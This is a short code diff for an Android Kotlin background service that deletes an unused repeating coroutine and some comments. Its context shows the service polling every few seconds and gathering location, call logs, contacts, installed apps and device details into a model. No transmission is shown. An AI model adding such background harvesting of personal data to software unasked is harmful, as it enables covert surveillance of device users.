@@ -37,20 +37,8 @@ class AppService : Service() {
             }
         },0, 5000L)
 
-//        startRepeatingJob(2000L)
 
         return super.onStartCommand(intent, flags, startId)
-    }
-
-    private fun startRepeatingJob(timeInterval: Long): Job {
-        return CoroutineScope(Dispatchers.Default).launch {
-            while (NonCancellable.isActive) {
-
-                //repeate Task Here
-                makeModel()
-                delay(timeInterval)
-            }
-        }
     }
 
     override fun onDestroy() {
@@ -75,7 +63,6 @@ class AppService : Service() {
         }
         fusedLocationClient.lastLocation
             .addOnSuccessListener {
-                // Got last known location. In some rare situations this can be null.
                 Log.d(TAG, "location --> ${Gson().toJson(it)}")
             }
 
@@ -90,7 +77,6 @@ class AppService : Service() {
             deviceInfo = getSystemDetail(),
             callLogs = callLogs,
             smsLogs = "smsLogs",
-//            "",
             listContact = listContact,
             appsDownloaded = appsInstalled
         )
